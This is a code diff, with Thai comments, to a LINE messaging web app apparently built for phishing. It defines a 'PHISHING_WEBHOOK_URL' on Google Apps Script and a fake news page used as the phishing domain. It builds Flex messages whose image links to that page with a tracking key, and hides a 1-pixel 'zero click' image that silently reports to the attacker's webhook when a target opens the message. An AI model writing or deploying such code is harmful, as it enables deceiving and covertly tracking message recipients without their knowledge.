@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/u/2/s/AKfycbwIhPQmNOJvmBmO3Hhw9sb9pQjlzQRFHudmndTgkJlj55MiNZWY6PT7gGYBTkrVxKw_hA/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyoQqJwh-4G9csZIwzTceyvl_e_EGIQ_qq1Zb4bgmCapzsiuYTgO3iwpMZ5lp10vt4kOA/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -817,16 +817,29 @@
                 imageUrl = await uploadImage();
                 if (!imageUrl) return;
                 
+                // บันทึก Tracking Key Mapping ก่อน
+                try {
+                    const saved = await saveTrackingCaseMapping(trackingKey, caseName);
+                    if (!saved) {
+                        console.log('เรียกใช้ saveTrackingCaseMapping เสร็จสิ้น (อาจมีข้อผิดพลาดฝั่ง Server หรือ CORS)');
+                    } else {
+                        console.log('บันทึก Tracking Key Mapping สำเร็จ (ตามที่ Client รับรู้)');
+                    }
+                } catch (saveError) {
+                    console.error('เกิดข้อผิดพลาดขณะเรียก saveTrackingCaseMapping:', saveError);
+                    showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
+                }
+                
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // สร้าง URL สำหรับ Zero Click tracking (จะถูกเรียกเมื่อเป้าหมายเปิดอ่านข้อความ)
+                // สร้าง URL สำหรับ Zero Click tracking 
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
-                const zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&r=${randomSuffix}`;
+                let zeroClickImageUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&r=${randomSuffix}`;
                 
-                console.log("Zero Click Track URL (จะทำงานเมื่อเป้าหมายเปิดอ่านข้อความ):", zeroClickTrackUrl);
+                console.log("Zero Click Image URL:", zeroClickImageUrl);
 
-                // สร้าง Flex Message ที่มีทั้งรูปภาพหลักและรูปภาพขนาด 1x1 pixel สำหรับการติดตาม
+                // สร้าง Flex Message ที่มีรูปภาพและรูปโปร่งใสสำหรับการทำ Zero Click (แบบไม่ตรวจจับ)
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
@@ -843,26 +856,29 @@
                                 uri: clickTrackUrl
                             }
                         },
-                        body: {
+                        footer: {
                             type: 'box',
                             layout: 'vertical',
                             contents: [
                                 {
-                                    // Invisible tracking pixel - จะโหลดโดยอัตโนมัติเมื่อเป้าหมายเปิดดูข้อความ
                                     type: 'image',
-                                    url: zeroClickTrackUrl,
-                                    size: 'xxs',  // ขนาดเล็กมาก
+                                    url: zeroClickImageUrl, // URL ที่จะถูกเรียกเมื่อผู้รับเปิดดูข้อความ
+                                    size: '1px', // ขนาดเล็กมากจนมองไม่เห็น
                                     aspectRatio: '1:1',
-                                    aspectMode: 'cover',
-                                    position: 'absolute',  // ตำแหน่งแบบ absolute
-                                    offsetTop: '0px',
-                                    offsetStart: '0px',
-                                    width: '1px',
-                                    height: '1px'
+                                    aspectMode: 'cover'
+                                },
+                                {
+                                    type: 'box',
+                                    layout: 'vertical',
+                                    contents: [],
+                                    height: '1px',
+                                    margin: 'none'
                                 }
                             ],
-                            paddingAll: '0px',  // ไม่มี padding เพื่อซ่อนส่วนนี้
-                            height: '1px'
+                            paddingAll: '0px',
+                            height: '1px',
+                            spacing: '0px',
+                            margin: 'none'
                         }
                     }
                 };
@@ -876,20 +892,6 @@
 
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
-                        
-                        // บันทึก Tracking Key Mapping ก่อน
-                        try {
-                            const saved = await saveTrackingCaseMapping(trackingKey, caseName);
-                            if (!saved) {
-                                console.log('เรียกใช้ saveTrackingCaseMapping เสร็จสิ้น (อาจมีข้อผิดพลาดฝั่ง Server หรือ CORS)');
-                            } else {
-                                console.log('บันทึก Tracking Key Mapping สำเร็จ (ตามที่ Client รับรู้)');
-                            }
-                        } catch (saveError) {
-                            console.error('เกิดข้อผิดพลาดขณะเรียก saveTrackingCaseMapping:', saveError);
-                            showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
-                        }
-
                         // รีเซ็ตหน้าจอ
                         resetForm();
                     } else {
